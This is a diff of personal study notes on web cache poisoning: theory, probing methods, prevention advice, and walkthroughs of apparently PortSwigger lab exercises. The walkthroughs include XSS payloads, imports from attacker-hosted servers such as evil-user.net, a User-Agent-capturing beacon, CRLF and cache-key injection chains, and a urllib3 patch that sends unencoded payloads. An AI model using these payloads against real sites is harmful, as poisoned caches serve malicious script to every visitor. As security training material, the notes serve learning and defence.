@@ -3,3 +3,477 @@ Web cache poisoning
 - Involve 2 phases:
     + How to elicit response from BE that contain dangerous payload
     + Their response is cached and served to intended victim
+- Impact: depend on 2 key factors
+    + What exactly the attacker can successfully get cached
+    + The amount of traffic on the affected page
+    + Note: Duration of cache entry doesn't necessarily affect the impact of web cache poisoning. An attack can usually be scripted in such a way to re-poisons the cache indefinitely
+- Construct attack:
+    + Step 1: Identify and evaluate unkeyed inputs:
+        + By adding random input to request and observing whether or not effect the response
+        + This can be obvious, such as reflecting input in response directly, or triggering entirely different response
+        + But sometimes effect are more subtle and require a bit of detective work to figure out
+        + Param Miner: (automation tool)
+            + It automaticlly send request with input from built-in header list
+            + If injected input effect response, go to Param Miner logs in to check
+        + Caution:
+            + When testing on live website, there is a risk causing cache to serve generated response to real users
+            + Make sure request all have a unique cache key so they only serverd to you (cache buster)
+    + Step 2: Elicit a harmful response from the BE server:
+        + Next step is evaluate how web process it
+        + If input reflect in response without being properly sanitized, or used to dynamic generate other data -> potential entry point
+    + Step 3: Get the response cached
+        + Confirm if response is cached
+        + It will depend on something like file extension, content-type, route, status code, response headers
+
+
+Exploiting cache design flaws
+- Using web cache poisoning to deliver an XSS attack:
+    + Simplest web cache poisoning is when unkeyed input is reflected in cacheable response without proper sanitization
+    + Example:
+        GET /en?region=uk HTTP/1.1
+        X-Forwarded-Host: innocent-website.co.uk
+        ----------
+        HTTP/1.1 200 OK
+        Cache-Control: public
+        <meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
+    + X-Forwarded-Host header is being used dynamically generate an Open Graph image URL and reflected in response
+    + This header if often unkeyed, can poison with simple payload
+        X-Forwarded-Host: a."><script>alert(1)</script>"
+    + Real attack could potentially steal password and hijack user account
+- Using web cache poisoning to exploit unsafe handling of resource imports: (1)
+    + Some web use unkeyed header to generate URL for importing resources (such as externally hosted JS file)
+    + If response contain malicious URL is cached, attacker's file would import and execute in browser session of any user request has a matching key
+    + Example:
+        GET / HTTP/1.1
+        X-Forwarded-Host: evil-user.net
+        -------------
+        HTTP/1.1 200 OK
+        <script src="https://evil-user.net/static/analytics.js"></script>
+- Using web cache poisoning to exploit cookie-handling vulnerabilities: (2)
+    + Cookies are often used to dynamic generate content in response
+    + Example: user language (Polish version)
+        Cookie: language=pl;
+    + Suppose that cache key contain request line and Host header, but not Cookie header.
+        + This case, if response is cached, all users tried to access blog would receive Polish version as well
+        + Can be exploit using web cache poioning
+    + In practice, this vector is relatively rare compare to header-based cache poisoning
+- Using multiple headers to exploit web cache poisoning vulnerabilities: (3)
+    + Here we need to craft request that manipulates multiple unkeyed input
+    + If web is using HTTPS but in request use another protocol, website will redirect to itself use HTTPS
+
+Exploiting responses that expose too much information: (4)
+- Sometimes website make themselves more vuln to web cache poisoning by giving away too much information about themselves and their behavior
+- Cache-control directives:
+    + Challenges to construct attack is ensure harmful response get cached
+    + Sometimes responses explicitly reveal some information attacker need to successfully poison the cache
+    + Example: harmless but useful for attacker
+        HTTP/1.1 200 OK
+        Via: 1.1 varnish-v4
+        Age: 174
+        Cache-Control: public, max-age=1800
+- Vary header:
+    + Specifies a list of additional headers that should be treated as part of cache key
+    + Commonly used to specify User-Agent header is keyed, so if mobile version of web is cached, this won't be served to non-mobile user by mistake
+    + Used to construct a multi-step attack to target a specific subset of user
+
+Using web cache poisoning to exploit DOM-based vulnerabilities: (10)
+- If web uses unkeyed headers to import files -> potentially exploit for attacker to import malicious file
+- Many web use JS to fetch and process additional data from BE. If script handle data in unsafe way, can lead to all kind of DOM-based vuln
+    + If that value is passed into a sink support dynamic code execution, payload would be execute in victim's browser session
+    + Note: if need to lead malicious JSON data from your server, need to grant the website access to JSON using CORS (on attacker's server)
+        Access-Control-Allow-Origin: *
+
+Chaining web cache poisoning vulnerabilities: (11)
+
+Exploiting cache implementation flaws:
+- Cache key flaws:
+    + As request line usually part of cache key -> these input traditionally have not been considered suitable for cache poisoning
+    + But in practice, many websites and CDNs perform various transformations on keyed components when they are saved in the cache key
+    + Some transformations can happen:
+        + Excluding the query string
+        + Filtering out specific query parameters
+        + Normalizing input in keyed components
+    + These are primarily based around different behavior between data written in cache key and data passed into BE system, even same input
+    -> Can be exploited via input that initially appear unusable
+    + In case of fully integrated, application-level caches, these quirks can be even more extreme. Internal cache can be so unpredictable and sometimes difficult to test them without poisoning cache for live users
+- Cache probing methodology:
+    + Identify a suitable cache oracle:
+        + Cache oracle; simply a page or endpoint that provide feedback about the cache's behavior
+        + Could have various forms, such as:
+            + An HTTP header that explicitly tells you whether you got a cache hit
+            + Observable changes to dynamic content
+            + Distinct response times
+        + Ideally, cache oracle also reflect entire URL and at least 1 param in response
+        + If it is a specific third-party cache is being used, can also consult the corresponding documentation
+    + Probe key handling:
+        + Goal: check whether cache perform any additional processing of input when generate cache key -> find hidden attack surface insire keyed components
+        + Look for any transformations, any thing excluded from keyed component when add to cache key. Like:
+            + Excluding specific query params
+            + Excluding the entire query string
+            + Removing the port from the Host header
+        + How to test:
+            + case 1: can see cache key directly -> compare different
+            + case 2: send 2 similar request, use cache oracle to see if got same cached response
+    + Identify an exploitable gadget:
+        + Final step: find a gadget to chain with the cache-key flaw. Attack severity depends heavily on the gadget
+        + Gadgets: classic client-side vuln (reflected XSS, open redirects...)
+            + Combine these, massively escalate severity of attack (such as XSS reflected -> STORED)
+            + No longer need to induce victim to visit a crafted URL, payload auto served to anyone visiting the normal legit URL
+        + More interestingly, these techniques enable exploit unclassified vuln that often dismissed as unexploitable and unpatched:
+            + Dynamic content in resoure files
+            + Exploit malformed request a browser would never send
+
+Exploiting cache key flaws:
+- Unkeyed port:
+    + Host header is often part of cache key, but some system parse it and exclude port
+    + Can enable DoS attack by redirect all user to a unused port
+    + Can be escalated further if web allow non-numeric port -> can inject XSS
+- Unkeyed query string:
+    + Request line is keyed, but cache key transformations to excluded entire query string
+    + Detecting:
+        + Problem: if response doesn't tell HIT/MISS, unkeyed query string make dynamic page look fully static (hard to know if talking with cache or server)
+        + If change param value, but query string is unkeyed, most time would still get cache hit -> make classic cache-buster redundant
+        + Solution:
+            + There are alternative ways such as adding to keyed header like
+                Accept-Encoding: gzip, deflate, cachebuster
+                Accept: */*, text/cachebuster
+                Cookie: cachebuster=1
+                Origin: https://cachebuster.vulnerable-website.com
+            + In Param Miner, select option "Add static/dynamic cache buster" and "Include cache busters in headers" -> auto add commonly keyed headers
+            + Another approach, to see any discrepancies between how cache and BE normalize the path of request, exploit this with different keys that hit the same endpoint. Similar to GET /
+                Apache: GET //
+                Nginx: GET /%2F
+                PHP: GET /index.php/xyz     (/xyz is path info -> ignore)
+                .NET GET /(A(xyz)/          (old syntax session in url)
+    + Exploiting: (5)
+- Unkeyed query parameters: (6)
+    + Some web onlt exclude specific query param that are not relevant to BE application (such as param for analytics or serving target advertisements)
+    + Param like utm_content are good candidates to check during test
+    + Vuln: hanle entire URL in vuln manner, making it possible to exploit arbitrary params
+- Cache parameter cloaking:
+    + Problem: If cache exclude harmless param and can't find any exploitable gadget based on full URL
+    + Parsing discrepancies between cache and application, allow to sneak arbitrary params into application logic by "cloaking" them in excluded param
+    + Example:
+        GET /?example=123?excluded_param=bad-stuff-here
+        + Poorly written algo will treat any ? as start of new param
+        + This case, cache identify 2 params and exclude the second one from cache key, but server only see 1 param (cuz ? not treat as delimiter)
+    + Exploiting parameter parsing quirks: (7)
+        + Ruby on Rails framework:
+            + Interprets both & and ; as delimiters
+            + Example:
+                GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
+                + Cache sees 2 param, but BE Ruby on Rails sees 3 params
+        + JSONP: may contain callback param to execute given function -> override callback -> arbitrary JS
+    + Exploiting fat GET support: (8)
+        + HTTP method may not be keyed, allow poison with POST request contain malicious payload in body
+        + Exploit:
+            + Case 1: POST request still can be serving to GET request (rare case)
+            + Case 2: Send GET request but contain payload to override param in request line
+                GET /?param=innocent
+                X-HTTP-Method-Override: POST    (maybe you need to contain this header)
+
+                param=bad-stuff-here
+                + X-HTTP-Method-Override is unkeyed -> could submit pseudo POST request while preserving GET cache key
+    + Exploiting dynamic content in resource imports:
+        + Imported resource file are typically static but some reflect input from query string
+            GET /style.css?excluded_param=123);@import… HTTP/1.1
+            -------------
+            HTTP/1.1 200 OK
+            …
+            @import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
+            + Cache param cloaking exploit + import malicious css directly in response
+        + Could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any page import /style.css
+        + If page forgte to specify doctype, may even exploit static css file
+            GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1
+            ------------------
+            HTTP/1.1 200 OK
+            Content-Type: text/html
+            …
+            This request was blocked due to…alert(1){}*{color:red;}
+            + No doctype -> quirk mode -> skip checking Content-type, scan until meet valid css then execute
+            + Make error page like Content-Type: text/html be read as css file
+- Normalized cache keys: (9)
+    + Any normalization applied to cache key can also introduce exploitable behavior or can enable some exploit that would otherwise be almost impossible
+    + For example, reflected XSS in param often unexploitable in practice
+        + Because modern browsers typically URL-encode when sending request, and server doesn't decode them -> victim only receive harmless url-encoded string
+        + Both of this have same key:
+            GET /example?param="><test>
+            GET /example?param=%22%3e%3ctest%3e
+        + If send request in Burp Repeater, can poison cache with unencoded XSS payload. Next, when victim visit url(both encoded and unencoded), it will calculate cache key that already stored in cache server and get poisoned response
+- Cache key injection: (12)
+    + Sometimes may discover client-side vuln in keyed header (classic unexploitable issue but sometimes be exploit using cache poisoning)
+    + Keyed components are often bundled together in string to create cache key
+    -> if cache doesn't implement proper escaping of delimiter between components, can exploit by craft 2 different request same cache key
+    + Example: using double-underscores to delimit different components
+        GET /path?param=123 HTTP/1.1
+        Origin: '-alert(1)-'__
+        ---------------
+        HTTP/1.1 200 OK
+        X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
+        <script>…'-alert(1)-'…</script>
+    + Exploit:
+        GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1
+        ------------
+        HTTP/1.1 200 OK
+        X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
+        X-Cache: hit
+        <script>…'-alert(1)-'…</script>
+
+Poisoning internal caches: (13)
+- Beside external cache, some implement directly into application (internal)
+    + Advantage:
+        + Avoid the kind of parsing discrepancies
+        + As these integrated cache are built for specific app -> give dev freedom to custom behavior to greater degree
+    + Disadvantage:
+        + Sometimes behave in unusual ways that wouldn't typically see from standard -> sometimes enable high-severity poisoning
+- Instead cache entire response, come break down into reusable fragment and cache them each separately
+    + For example, snippet for importing resource might be stored as standalone cache entry
+    + User might receive response comprising mixture of content from server (several individual fragment from the cache)
+- These cached fragment are intended to be reusable across multiple distinct response -> concept of cache key doesn't really apply
+    + Every response contain fragment will reuse same cached fragment, even if the rest of response is completely different
+    -> Poison cache can have wide-reaching effect, especially if poison fragment that used on every page
+- This will only require to use basic techniques, such as manipulating Host header
+- How to identify internal caches:
+    + Challenge: difficult to identify because there is often no user-facing feedback
+    + Solution: Look for a few tell-tale signs
+        + Response reflect mixture of input from last request and from previous request -> key indicator that cache store fragment rather than entire response
+        + Input reflect on multiple distinct pages that you never injected
+    + If behavior is so unusual that most logical conclusion is that must be unique and specialized internal cache
+    + But if web implement multiple layers of caching -> can make difficult to comprehend what happening behind scenes and understand how website's caching system behaves
+- Testing internal caches safely:
+    + Recommend using cache buster to prevent poisoned response served to other users
+    + If integrated cache has no concept of cache key -> traditional cache busters are useless
+    + Important to mitigate potential damage when testing these vuln
+    + Think carefully about effect of your injected payload before sending
+    + Should make sure only poison cache using domain that you control
+
+How to prevent web cache poisoning vulnerabilities:
+- Best way would be to disable caching altogether
+- If only use caching because it turn on by default when adepted CDN, should evaluating whether caching option really need?
+- Even need to use, restricting it to purely static response is also effective (wary about what classify as static)
+- Make sure attack can't trick BE server into retrieving malicious version resource instead of real one
+- No matter how robust your own internal security posture may be, it still rely on third-party technology
+- On basic, need to understand the security implication of any third-party before integrate it
+- Not only context of web cache poisoning, not only deciding switched on by fault, but also looking at which headers are supported by CDN
+- When implement caching, need to:
+    + If you are considering excluding something from cache key for performance reasons, rewrite the request instead
+    + Don't accept fat GET request, aware of third-party technologies may permit by default
+    + Patch client-side vuln even if they seem unexploitable, some might actually be exploitable due to unpredictable quirk in cache behavior
+
+
+01_Web_cache_poisoning_with_an_unkeyed_header
+- Just normally add X-Forwarded-Host header to overide the Host
+- Reflect input:
+    <script type="text/javascript" src="//{Host}/resources/js/tracking.js"></script>
+- Payload for headers:
+    custom_headers = {
+        'X-Forwarded-Host': exploit_url.split('//')[1],
+    }
+
+02_Web_cache_poisoning_with_an_unkeyed_cookie
+- Try to escape cookie string in response
+    <script>
+        data = {"host":"{Host}","path":"/","frontend":"prod-cache-01"}
+    </script>
+- Payload for cookies:
+    'fehost': '"}%3balert(1)%3b//{"',
+
+03_Web_cache_poisoning_with_multiple_headers
+- This case, we can't inject directly, need to do it through that auto import when reload page
+    + Easy to see that /resources/js/tracking.js has been import every reload
+- To inject content through file, we can cause it redirect to a malicious file on attacker's server
+    + We can combine X-Forwarded-Host and X-Forwarded-Scheme together
+    + If X-Forwarded-Scheme != HTTPS will cause a redirect
+    + X-Forwarded-Host will override Host header
+    + Combine these 2 can cause file redirect to another malicious file on attacker's server
+- When reload homepage, will automaticlly import malicious file
+- Payload for headers:
+    custom_headers = {
+        'X-Forwarded-Host': exploit_url.split('//')[1],
+        'X-Forwarded-Scheme': 'nothttps'
+    }
+
+04_Targeted_web_cache_poisoning_using_an_unknown_header
+- Victim will view all comment you post
+    + Read /resources/js/loadComments.js file, see allowed tag and attribute
+        ALLOWED_TAGS: ['b', 'i', 'u', 'img', 'a'], ALLOWED_ATTR: ['src', 'href']
+    + We can construct payload like <img src="{exploit_url}/log">
+    + All traffic view that page will redirect to attacker's server -> can obtain victim's User-Agent
+- Next just use Param Miner to bruteforce header that dynamically generated import url
+    + Result that X-Host is doing that
+- Add X-Host: exploit_host and change User-Agent to victim
+
+05_Web_cache_poisoning_via_an_unkeyed_query_string
+- All lab in this topic can add Pragma: x-get-cache-key to see which is keyed
+- Try /, // and add cache buster to check behavior of it
+    + Easy to see that param value is unkeyed
+    + But path still dynamic in response
+        <link rel="canonical" href='{host}{request line}'>
+- Payload: escape and stored XSS
+    /?'><script>alert(1)</script>
+
+06_Web_cache_poisoning_via_an_unkeyed_query_parameter
+- Use Param Miner -> "Guess GET parameters" -> identify utm_content param is unkeyed
+    + It ignore in cache key but still dynamic in response like previous lab 05
+- Payload:
+    /?utm_content='/><script>alert(1)</script>
+
+07_Parameter_cloaking
+- Param Miner -> Guess query params -> identify utm_content param is unkeyed
+    + Now it's impossible to escape out of string, being encoded in response
+- Notice file that auto import when open homepage
+    <script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie">
+    + callback param here is name of function that using dynamic in file
+    setCountryCookie({"country" : "United Kingdom"})
+- Combine unkeyed param and callback, we can override callback value but cache still think that part of unkeyed by using ; delimiter
+- Payload:
+    /js/geolocate.js?callback=setCountryCookie&utm_content=test;callback=alert(1)%3b//
+
+08_Web_cache_poisoning_via_a_fat_GET_request
+- Again, notice geolocate.js file
+    /js/geolocate.js?callback=setCountryCookie
+    + It contain param in request line and keyed
+    + But body of GET request is unkeyed, so we put callback param in body to override value in request line
+- Payload:
+    GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
+    callback=alert(1);//
+
+09_URL_normalization
+- How to let request line not encoding:
+    + If calling function normally, path will be encoded, so need to custom config additional things
+    + Layer 1: PreparedRequest.prepare_url()
+        + Called automatically when prepare() runs
+        + arse and encode every char not in RFC 3986 allowed set
+        + Fix: after prepare(), override prepped.url = target_url
+    + Layer 2: HTTPAdapter.request_url()
+        + Called inside s.send(), takes prepped.url and run requote_uri() again
+        + This re-encodes URL, nullifying Layer 1 fix
+        + Fix: NoEncodeAdapter override request_url() with urldefragauth() (only strips fragment, no encoding)
+    + Layer 3: urllib3._encode_invalid_chars()
+        + Called deep inside conn.urlopen() via parse_url()
+        + Encodes any char not in PATH_CHARS (RFC 3986 valid set)
+        + < > not in PATH_CHARS -> encoded to %3C %3E
+        + Fix: monkey-patch at import time
+            urllib3.util.url._encode_invalid_chars = lambda component, allowed_chars, encoding="utf-8": component
+- When try to redirect to random path (like /test), it will return
+    <p>Not Found: /test</p>
+    + We can inject XSS payload here and let it cache
+    + Both encoded and unencoded have same cache key, so just phishing with it and don't care about modern browser encoded
+- Payload:
+    /</p><script>alert(1)</script><p>foo
+
+10_Web_cache_poisoning_to_exploit_a_DOM_vulnerability_via_a_cache_with_strict_cacheability_criteria
+- Param Miner show that X-Forwarded-Host header is allowed to include in request
+    + Add X-Forwarded-Host: exploit_host
+    + See that data.host var has been changed
+- Notice file /resources/js/geolocate.js and /resources/json/geolocate.json
+    + File /resources/js/geolocate.js have a DOM-based XSS vuln in inner function
+        div.innerHTML = 'Free shipping to ' + j.country;
+    + /resources/json/geolocate.json contain json data
+        { "country": "United Kingdom" }
+    + If we can inject malicious data in json file or fetch from attacker's server
+    -> Possible XSS page
+- The url used to fetch json data is depend on data.host in homepage
+    + If we use X-Forwarded-Host, json will be fetched from attacker's server
+    + Then json data will be injected in innerHTML function -> trigger XSS
+- Payload:
+    { "country": "<img src=1 onerror=alert(document.cookie) />" }
+- Notes:
+    + Must have cookie session to be cacheable
+    + Remember to add Access-Control-Allow-Origin: * in exploit server
+    + Idk but Param Miner not work for me (Community Edition), i need to learn more how to use it
+
+11_Combining_web_cache_poisoning_vulnerabilities
+- Read file /resources/js/translations.js and analysis
+    + Default language is en, adding cookie lang={language} to change language
+    + Json data is stored in path /resources/json/translations.json
+    + Example of json content:
+        {
+            "en": {
+                "name": "English"
+            },
+            "es": {
+                "name": "español",
+                "translations": {
+                    "My account": "<img src=x onerror='alert(document.cookie)'>"
+                }
+            }
+        }
+    + With this, if lang set to es, all string "My account" will be translated and trigger XSS
+- Like previous lab, this is possible to override data.host to exploit_host and get cached that response
+- This translate() function only works if lang.toLowerCase() !== 'en'
+    + But normal user only visit page normally and using lang=en
+    + So we need to force user change language on your own via X-Original-URL (help replace real path by this value)
+    + Language can change if success redirect user to /setlang/{lang}, but response of this contain cookie -> can't cache
+    + So we change to /setlang\es, it will normalize and redirect to /setlang/es (not contain cookie -> cacheable) -> 302 redirect and set-cookie
+- Process of attack:
+    + Create malicious json file in attacker's server in this path /resources/json/translations.json
+    + Cache the homepage and using X-Forwarded-Host -> data.host = exploit_host -> import malicious file from attacker's server
+        initTranslations('//' + data.host + '/resources/json/translations.json');
+    + Cache the homepage with cache buster (/?x=t, new cache key) and using X-Original-URL (/setlang\es) -> response redirect to /setlang/es (not contain cookie -> cacheable)
+- Notes:
+    + Must have cookie session to be cacheable
+    + Remember to add Access-Control-Allow-Origin: * in exploit server
+    + Idk but Param Miner not work for me (Community Edition), i need to learn more how to use it
+
+12_Cache_key_injection
+- Use Pragma: x-get-cache-key too see format of cache key
+    + Format: {request line exclude utm_content}$$origin={Origin value}
+- Chain 5 vuln:
+    + Vuln 1: Flaw in exclude utm_content param from cache key
+        /login?lang=en?utm_content=anything
+        Cache key: /login?lang=en$$, server sees lang="en?utm_content=anything"
+    + Vuln 2: Client-side parameter pollution via lang param
+        + In /login/?lang={lang} page, import /js/localize.js?lang={lang}&cors=0
+        + If can inject cors=1 -> Can CRLF injection
+        /login?lang=en?utm_content=x%26cors=1%26x=1%23 (use this)
+        -> Redirect to: /login/?lang=en?utm_content=x%26cors=1%26x=1#
+        -> Import: /js/localize.js?lang=en?utm_content=x&amp;cors=1&amp;x=1#&cors=0
+        + Treat cors=0 as fragment (&x=1 just a cache buster) -> cors value is set to 1
+    + Vuln 3: CRLF injection via Origin header
+        + Reflect origin header without sanitization
+        Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)
+        -> Origin: origin=x\r\nContent-Length: 8\r\n\r\nalert(1)
+        + With cors=1, origin will reflect full in Access-Control-Allow-Origin and allow CRLF
+        -> Have Content-Length: 8 -> body = alert(1)
+    + Vuln 4: Web cache poisoning via resource file
+        + Because request line and origin header are bundled in cache key and separate by $$ delimiter
+        + Combine exclude param + cache key injection + CRLF injection -> override file content to alert(1)
+        GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
+        Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
+    + Vuln 5: Cache key injection via $$ delimiter
+        + Request line (exclude utm_content param) and Origin are keyed in cache key and separate by delimiter $$
+        + Keyed components are often bundled together in a string to create the cache key
+        + But not implement proper escaping of delimiters between components
+        -> Can exploit by craft 2 different request same cache key
+        GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
+        -> GET /login?lang=en?utm_content=x&cors=1&x=1$$origin=x\r\nContent-Length: 8\r\n\r\nalert(1)$$#
+        -> X-Cache-Key: /login?lang=en$$  (all string after utm_content is ignored)
+- Encoding:
+    + %26 -> &
+    + %25 -> %
+    + %250d%250a -> %0d%0a -> \r\n
+    + %23 -> #
+    + %20 -> space
+- Need double encoding in CRLF:
+    + In 302 redirect /login to /login/, Location value is still raw string
+    + In homepage, <script> tag decode %250d%250a -> %0d%0a and encode & -> &amp;
+    + It will import file with cache key same as injected file in vuln 4
+    + Ensure CRLF is not exist in redirect response, only in target response
+- Exploit:
+    + Step 1: Poison /js/localize.js to store malicious content alert(1)
+    + Step 2: Poison /login?lang=en to redirect to url that have malicious param
+- Note:
+    + Notice number $ in cache key in order to match stored key
+    + Encoding double time to bypass redirect
+
+13_Internal_cache_poisoning
+- At first look at header response, nothing let we know that it cached or not
+- Param Miner -> X-Forwarded-Host header is unkeyed in internal cache (maybe extension works, wish for luck)
+- In homepage, there are 3 dynamic URLs: canonical link, import resource file /js/analytics.js and /js/geolocate.js
+    + First request try to send with X-Forwarded-Host point to attacker's server, result that canonical link and file analytics import is change to attack's host, but geolocate is not. But try again few time it the geolocate is also can change to attacker's host
+    + Second request, just send normal request, excluded X-Forwarded-Host header, file import geolocate is still point to attacker's server although 2 other is turn back normal
+    -> It cached file geolocate.js fragment (not entire response)
+    -> Fragment cached will poison all page without needing any else
+- So we just need to store malicious file on attacker's server, make it cache fragment for that file once, then other request to any page contain that file import will be poisoned
+- I don't know exactly how it work, just try and test yourself
